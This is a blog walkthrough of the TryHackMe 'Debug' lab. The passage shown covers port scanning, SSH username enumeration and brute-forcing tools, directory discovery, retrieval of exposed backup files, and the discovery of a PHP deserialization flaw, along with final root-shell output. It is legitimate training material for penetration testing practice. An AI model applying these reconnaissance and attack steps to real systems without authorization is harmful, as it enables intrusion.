. drwxr-xr-x 24 root root 4096 Feb 28 2019 .. -rw------- 1 root root 1257 Mar 10 18:38 .bash_history -rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrc drwxr-xr-x 3 root root 4096 Mar 9 20:01 .bundle drwx------ 2 root root 4096 Mar 10 18:36 .cache drwxr-xr-x 3 root root 4096 Mar 9 20:00 .gem drwxr-xr-x 2 root root 4096 Mar 10 18:35 .nano -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 33 Mar 9 20:56 root.txt drwx------ 2 root root 4096 Mar 9 20:55 .ssh -rw-r--r-- 1 root root 211 Mar 9 19:59 .wget-hsts bash-4.3# bash-4.3# The flag is of the characters what we need!\nbash-4.3# wc -c root.txt 33 root.txt bash-4.3# id uid=1001(james) gid=1001(james) euid=0(root) groups=1001(james) bash-4.3# uname -a Linux osboxes 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux  Thanks for reading the walkthrough, hopefully you enjoyed it. I think maybe I was too verbose while writing it :P\n","wordCount":"3986","inLanguage":"en","image":"https://umar0x01.sh/images/debug-thm/Pasted%20image%2020210403143158.png","datePublished":"2021-04-03T00:00:00Z","dateModified":"2021-04-03T00:00:00Z","author":{"@type":"Person","name":"Umar_0x01"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://umar0x01.sh/post/debug-thm/"},"publisher":{"@type":"Organization","name":"Umar_0x01 – Pentester | Programmer | Your average sakurity guy ( ͡~ ͜ʖ ͡°)","logo":{"@type":"ImageObject","url":"https://umar0x01.sh/favicon/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a class=label_text_header href=https://umar0x01.sh accesskey=h title="> umar_0x01 | blog (Alt + H)"><span id=cusor_blink>></span> umar_0x01 | blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://umar0x01.sh/archives/ title=Posts><span>Posts</span></a></li><li><a href=https://umar0x01.sh/anime/ title=Anime><span>Anime</span></a></li><li><a href=https://umar0x01.sh/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://umar0x01.sh/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://umar0x01.sh/tags/ title=Tags><span>Tags</span></a></li></ul></nav><script type=text/javascript>var cursor=!0,speed=500;setInterval(()=>{cursor?(document.getElementById('cusor_blink').style.opacity=0,cursor=!1):(document.getElementById('cusor_blink').style.opacity=1,cursor=!0)},speed)</script></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://umar0x01.sh>Home</a>&nbsp;»&nbsp;<a href=https://umar0x01.sh/post/>Posts</a></div><h1 class=post-title>TryHackMe - Debug</h1><div class=post-description>Walkthrough of the machine Debug on TryHackMe - https://tryhackme.com/room/debug</div><div class=post-meta>April 3, 2021&nbsp;·&nbsp;19 min&nbsp;·&nbsp;Umar_0x01</div></header><div class=post-content><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><hr><p><strong>IP:</strong> 10.10.51.225</p><hr><p>We can scan the host using <a href=https://github.com/RustScan/RustScan>rustscan</a> (like nmap; but faster!) for open ports:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>rustscan -a 10.10.51.225 --timeout <span style=color:#ae81ff>5000</span> --tries <span style=color:#ae81ff>2</span> --ulimit <span style=color:#ae81ff>5000</span> -- -sC -sV
</code></pre></div><ul><li><code>-a</code> specifies the Host IP address</li><li><code>--timeout</code> specifies the timeout before saying the port is closed</li><li><code>--tries</code> how many times to try and connect to the port</li><li><code>--ulimit</code> specifies how many sockets to open at a time</li><li><code>--</code> for passing arguments for nmap</li><li><code>-sC -sV</code> nmap arguments telling rustscan to run default scripts and version fingerprinting</li></ul><p>Scan results:</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403130608.png alt></p><hr><p>Alright, so, we&rsquo;ve found 2 open ports. 22 and 80.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>root💀b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Downloads<span style=color:#f92672>]</span>                                                                                                                                                                               <span style=color:#f92672>[</span>95/999<span style=color:#f92672>]</span>
└─# rustscan -a 10.10.51.225 --timeout <span style=color:#ae81ff>5000</span> --tries <span style=color:#ae81ff>2</span> --ulimit <span style=color:#ae81ff>5000</span> -- -sC -sV   
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> The config file is expected to be at <span style=color:#e6db74>&#34;/root/.rustscan.toml&#34;</span>
<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Automatically increasing ulimit value to 5000.
Open 10.10.51.225:22
Open 10.10.51.225:80
<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Starting Script<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>&gt;<span style=color:#f92672>]</span> Script to be run Some<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;nmap -vvv -p {{port}} {{ip}}&#34;</span><span style=color:#f92672>)</span>

<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-04-03 13:04 PKT
NSE: Loaded <span style=color:#ae81ff>153</span> scripts <span style=color:#66d9ef>for</span> scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel <span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
Initiating Ping Scan at 13:04
Scanning 10.10.51.225 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>
Completed Ping Scan at 13:04, 0.34s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 13:04
Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 13:04, 0.01s elapsed
DNS resolution of <span style=color:#ae81ff>1</span> IPs took 0.01s. Mode: Async <span style=color:#f92672>[</span><span style=color:#75715e>#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
Initiating SYN Stealth Scan at 13:04
Scanning 10.10.51.225 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
Discovered open port 80/tcp on 10.10.51.225
Discovered open port 22/tcp on 10.10.51.225
Completed SYN Stealth Scan at 13:04, 0.25s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> total ports<span style=color:#f92672>)</span>
Initiating Service scan at 13:04
Scanning <span style=color:#ae81ff>2</span> services on 10.10.51.225
Completed Service scan at 13:05, 6.52s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
NSE: Script scanning 10.10.51.225.
NSE: Starting runlevel <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 6.38s elapsed                                                                    
NSE: Starting runlevel <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.                                                                    
Initiating NSE at 13:05                                                                                  
Completed NSE at 13:05, 0.82s elapsed                                                                    
NSE: Starting runlevel <span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
Initiating NSE at 13:05                 
Completed NSE at 13:05, 0.00s elapsed   
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.51.225       
Host is up, received reset ttl <span style=color:#ae81ff>60</span> <span style=color:#f92672>(</span>0.28s latency<span style=color:#f92672>)</span>.
Scanned at 2021-04-03 13:04:58 PKT <span style=color:#66d9ef>for</span> 14s                                                               

PORT   STATE SERVICE REASON         VERSION                                                              
22/tcp open  ssh     syn-ack ttl <span style=color:#ae81ff>60</span> OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey:      
|   <span style=color:#ae81ff>2048</span> 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX
81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h
|   <span style=color:#ae81ff>256</span> 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs<span style=color:#f92672>=</span>
|   <span style=color:#ae81ff>256</span> 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da💿fc:67 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb
80/tcp open  http    syn-ack ttl <span style=color:#ae81ff>60</span> Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
| http-methods:        
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                    
NSE: Script Post-scanning.
NSE: Starting runlevel <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.
Initiating NSE at 13:05      
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.                                                                    
Initiating NSE at 13:05                                                                                  
Completed NSE at 13:05, 0.00s elapsed                                                                    
NSE: Starting runlevel <span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span>of 3<span style=color:#f92672>)</span> scan.                                                                    
Initiating NSE at 13:05             
Completed NSE at 13:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 14.76 seconds      
           Raw packets sent: <span style=color:#ae81ff>6</span> <span style=color:#f92672>(</span>240B<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span>128B<span style=color:#f92672>)</span>

</code></pre></div><hr><h3 id=ssh-port-22>SSH (Port 22)<a hidden class=anchor aria-hidden=true href=#ssh-port-22>#</a></h3><p>Let&rsquo;s go with the waterfall mechanism and first enumerate port 22. We can try credentials bruteforcing using <a href=https://github.com/1N3/BruteX>BruteX</a> and check the version for any vulnerabilities which are public and exploitable.</p><p>From googling the exact banner/version, we can see that the specific version is vulnerable to username enumeration</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403132341.png alt></p><p>&ndash;</p><p>Let&rsquo;s try and do it using metasploit&rsquo;s module.</p><p>We can search for the module using <code>search</code> with an filter of <code>port:22</code> for only searching for everything written for SSH/Port22 with enum</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>search port:22 ssh_enum
</code></pre></div><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403132441.png alt></p><p>&ndash;</p><p>Let&rsquo;s run it.</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403132511.png alt></p><p>&ndash;</p><p>We can see that it enumerated the user root and can probably guess the password will be something really long. Let&rsquo;s goto port 80 for now and we&rsquo;ll come back to SSH if we need something.</p><hr><h3 id=http-port-80>HTTP (Port 80)<a hidden class=anchor aria-hidden=true href=#http-port-80>#</a></h3><p>Let&rsquo;s browse the application to get an idea in which programming language it was written, what&rsquo;s it&rsquo;s using as it&rsquo;s backend server, etc.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#960050;background-color:#1e0010>http://10.10.51.225/
</span></code></pre></div><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403132639.png alt></p><p>So, we get meeted with Apache2&rsquo;s default installation page. Let&rsquo;s try and see if <code>/robots.txt</code> has something in it.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#960050;background-color:#1e0010>http://10.10.51.225/robots.txt
</span></code></pre></div><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403132759.png alt></p><p>Sadly, it doesn&rsquo;t exist either.</p><p>&ndash;</p><p>We can now utilize <a href=https://github.com/OJ/gobuster>gobuster</a> or <a href=https://github.com/maurosoria/dirsearch>dirsearch</a> to enumerate the hidden directories hosted on the web application.</p><p>I&rsquo;ll use <code>dirsearch</code> to save some time downloading and setting up <code>gobuster</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 dirsearch.py -u http://10.10.51.225 -e all -t <span style=color:#ae81ff>100</span>
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>root💀b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tools/dirsearch<span style=color:#f92672>]</span>
└─# python3 dirsearch.py -u http://10.10.51.225 -e all -t <span style=color:#ae81ff>100</span>                                                                                                                                                  <span style=color:#ae81ff>1</span> ⨯
/mnt/hgfs/tools/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 <span style=color:#f92672>(</span>1.26.2<span style=color:#f92672>)</span> or chardet <span style=color:#f92672>(</span>4.0.0<span style=color:#f92672>)</span> doesn<span style=color:#e6db74>&#39;t match a supported version!
</span><span style=color:#e6db74>  warnings.warn(&#34;urllib3 ({}) or chardet ({}) doesn&#39;</span>t match a supported <span style=color:#e6db74>&#34;
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>  _|. _ _  _  _  _ _|_    v0.4.1
</span><span style=color:#e6db74> (_||| _) (/_(_|| (_| )
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>Extensions: all | HTTP method: GET | Threads: 100 | Wordlist size: 8948
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>Error Log: /mnt/hgfs/tools/dirsearch/logs/errors-21-04-03_13-30-02.log
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>Target: http://10.10.51.225/
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>Output File: /mnt/hgfs/tools/dirsearch/reports/10.10.51.225/_21-04-03_13-30-03.txt
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>[13:30:03] Starting: 
</span><span style=color:#e6db74>[13:30:16] 403 -  277B  - /.ht_wsr.txt
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.htaccessOLD
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.htaccess_orig
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.htaccess_sc
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.htaccessBAK
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.htaccess_extra
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.htaccessOLD2
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.htm
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.htpasswd_test
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.html
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.httr-oauth
</span><span style=color:#e6db74>[13:30:17] 403 -  277B  - /.htpasswds
</span><span style=color:#e6db74>[13:30:18] 403 -  277B  - /.htaccess.sample
</span><span style=color:#e6db74>[13:30:19] 403 -  277B  - /.htaccess.save
</span><span style=color:#e6db74>[13:30:19] 403 -  277B  - /.htaccess.bak1
</span><span style=color:#e6db74>[13:30:19] 403 -  277B  - /.htaccess.orig
</span><span style=color:#e6db74>[13:30:20] 403 -  277B  - /.php3
</span><span style=color:#e6db74>[13:30:21] 403 -  277B  - /.php
</span><span style=color:#e6db74>[13:30:35] 301 -  313B  - /backup  -&gt;  http://10.10.51.225/backup/
</span><span style=color:#e6db74>[13:30:36] 200 -    2KB - /backup/
</span><span style=color:#e6db74>[13:30:45] 200 -   11KB - /index.html
</span><span style=color:#e6db74>[13:30:46] 301 -  317B  - /javascript  -&gt;  http://10.10.51.225/javascript/
</span><span style=color:#e6db74>[13:30:46] 200 -    6KB - /index.php
</span><span style=color:#e6db74>[13:30:46] 200 -    6KB - /index.php/login/
</span><span style=color:#e6db74>[13:31:02] 200 -    2KB - /readme.md
</span><span style=color:#e6db74>[13:31:03] 403 -  277B  - /server-status/
</span><span style=color:#e6db74>[13:31:03] 403 -  277B  - /server-status
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>Task Completed
</span><span style=color:#e6db74>
</span></code></pre></div><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403133131.png alt></p><p>&ndash;</p><p>Alright, we can see <code>/backup/</code> directory and <code>/readme.md</code> which also seems kinda interesting. Let&rsquo;s visit these and see what&rsquo;s hosted in them.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#960050;background-color:#1e0010>http://10.10.51.225/readme.md
</span></code></pre></div><p>Let&rsquo;s cURL it.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$~ curl -i http://10.10.51.225/readme.md

<span style=color:#75715e># Welcome to Base                 </span>
A super simple, responsive framework built to work on mobile devices, tablets, netbooks and desktop computers.

<span style=color:#75715e>## Reasons to use base for your next web project</span>
<span style=color:#75715e>### Responsive Design</span>
Built <span style=color:#66d9ef>for</span> all devices big and small, base has got you covered.

<span style=color:#75715e>### Foundation Styles</span>
Custom styles <span style=color:#66d9ef>for</span> headings, tables, blockquotes forms and much more.

<span style=color:#75715e>### Accessibility in mind</span>
Works with screen readers in mind and has JS fallbacks.

<span style=color:#75715e>### Easy to learn</span>
Well commented CSS to ensure your implementation is a breeze.

<span style=color:#75715e>### Cross-Browser</span>
Covers IE7+ and modern browsers such as Chrome, Firefox and Opera.

<span style=color:#75715e>### Base is Awesome!</span>
Preview the <span style=color:#f92672>[</span>demo page<span style=color:#f92672>](</span>http://matthewhartman.github.com/base/demo/<span style=color:#f92672>)</span> to see the Base Framework in all its glory! :<span style=color:#f92672>)</span>


<span style=color:#75715e>## Repo Contents</span>
1. readme.md - Feel free to delete this! ;<span style=color:#f92672>)</span>
2. index.html - An example page with Base in action
3. style.css - Base stylesheet including styles <span style=color:#66d9ef>for</span> headings, tables, body content, etc
4. default.js - Base javascript file to get you started

Base was built by Matthew Hartman <span style=color:#f92672>(</span>@hartmanmatthew<span style=color:#f92672>)</span>, a passionate front end developer based in Melbourne, Australia.

<span style=color:#75715e>## Thank You / Credits</span>
- Mark Otto <span style=color:#f92672>(</span>@mdo<span style=color:#f92672>)</span> &amp; Jacob Thornton <span style=color:#f92672>(</span>@fat<span style=color:#f92672>)</span> <span style=color:#66d9ef>for</span> some base styles taken from BootStrap
- Nicolas Gallagher <span style=color:#f92672>(</span>@necolas<span style=color:#f92672>)</span> <span style=color:#66d9ef>for</span> the Micro ClearFix :<span style=color:#f92672>)</span>

</code></pre></div><p>We can see that it returns README.md source of some repository, maybe we can explore it later?</p><p>For now, let&rsquo;s move to the <code>/backup/</code> folder</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#960050;background-color:#1e0010>http://10.10.51.225/backup/
</span></code></pre></div><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403133609.png alt></p><p>The <code>/backup/</code> directory contains interesting .bak files, let&rsquo;s <code>cURL</code> those one by one and see their source code.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>root💀b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tools/dirsearch<span style=color:#f92672>]</span>
└─# curl -i http://10.10.51.225/backup/index.html.bak                                                    
HTTP/1.1 <span style=color:#ae81ff>200</span> OK                                                                                          
Date: Sat, <span style=color:#ae81ff>03</span> Apr <span style=color:#ae81ff>2021</span> 08:36:44 GMT                                                                      
Server: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>                                                                           
Last-Modified: Wed, <span style=color:#ae81ff>10</span> Mar <span style=color:#ae81ff>2021</span> 01:10:05 GMT                                                             
ETag: <span style=color:#e6db74>&#34;2c39-5bd2453bf4a05&#34;</span>                                                                               
Accept-Ranges: bytes                                                                                     
Content-Length: <span style=color:#ae81ff>11321</span>                                                                                    
Content-Type: application/x-trash                                                                        
                                                    
                                                    
&lt;!DOCTYPE html PUBLIC <span style=color:#e6db74>&#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34;</span> <span style=color:#e6db74>&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;</span>&gt;                                                                                          
&lt;html xmlns<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xhtml&#34;</span>&gt;
  &lt;!--
    Modified from the Debian original <span style=color:#66d9ef>for</span> Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  --&gt;
  &lt;head&gt;
    &lt;meta http-equiv<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Content-Type&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/html; charset=UTF-8&#34;</span> /&gt;
    &lt;title&gt;Apache2 Ubuntu Default Page: It works&lt;/title&gt;
    &lt;style type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/css&#34;</span> media<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;screen&#34;</span>&gt;
  * <span style=color:#f92672>{</span>
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  <span style=color:#f92672>}</span>

  body, html <span style=color:#f92672>{</span>
    padding: 3px 3px 3px 3px;

    background-color: <span style=color:#75715e>#D8DBE2;</span>

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  <span style=color:#f92672>}</span>

  div.main_page <span style=color:#f92672>{</span>

</code></pre></div><p>We can see that the page also points to default Apache installation page. Let&rsquo;s try <code>.php.bak</code> file now.</p><p>I&rsquo;ll be downloading and analysing it in Sublime text (text editor).</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>root💀b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tools/dirsearch<span style=color:#f92672>]</span>
└─# curl http://10.10.51.225/backup/index.php.bak -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>6399</span>  <span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>6399</span>    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>  <span style=color:#ae81ff>10438</span>      <span style=color:#ae81ff>0</span> --:--:-- --:--:-- --:--:-- <span style=color:#ae81ff>10438</span>
                                                                                                                     
┌──<span style=color:#f92672>(</span>root💀b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tools/dirsearch<span style=color:#f92672>]</span>
└─# 
                                                                                                    
┌──<span style=color:#f92672>(</span>root💀b0x<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tools/dirsearch<span style=color:#f92672>]</span>
└─# head index.php.bak    
&lt;!doctype html&gt;
&lt;html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span> class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;no-js&#34;</span>&gt;
&lt;head&gt;
  &lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>&gt;
  &lt;title&gt;Base&lt;/title&gt;
  &lt;meta name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;description&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>&gt;
  &lt;meta name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, minimum-scale=1.0, maximum-scale=1.0&#34;</span>&gt;
  &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> media<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;screen&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;style.css&#34;</span>&gt;
&lt;/head&gt;
&lt;body&gt;

</code></pre></div><p>&ndash;</p><p>In the heading, we can see that it too points to the same framework <strong>Base</strong> which was discussed above in the README.md file, let&rsquo;s try searching this framework.</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403134059.png alt></p><p>So, the guy has deleted this repository (base) from his github account. Maybe shifted somewhere else? Let&rsquo;s try searching it on google rather than using the link from <code>readme.md</code> file.</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403134336.png alt></p><p>Seeing the <code>readme.md</code> contents again, we can probably deduce that this framework (if used) is only going to be used for styling. Since, it doesn&rsquo;t mention anywhere in the <code>README.md</code> file that there is any PHP code in it.</p><p>&ndash;</p><p>We can continue reading the source code of the <code>index.php.bak</code> file for now.</p><p>&ndash;</p><p>We can see on line 216 &ndash; 220. We can just input a <code>$_GET['debug']</code> debug parameter with serialize input and the source code will unserialize it.</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403134619.png alt></p><p>We know that the code is vulnerable to PHP Deserialization but how to exploi this? We only have the .bak file and this won&rsquo;t execute/render as PHP on the server.</p><p>Were there any hidden directories we missed while the enumeration?</p><p><img loading=lazy src=/images/debug-thm/Pasted%20image%2020210403134923.png alt></p><p>Yes! we didn&rsquo;t discuss <code>/index.php</code> file, let&rsquo;s try accessing it.</p><p>The page looks something like this:</p><p><img loading=lazy 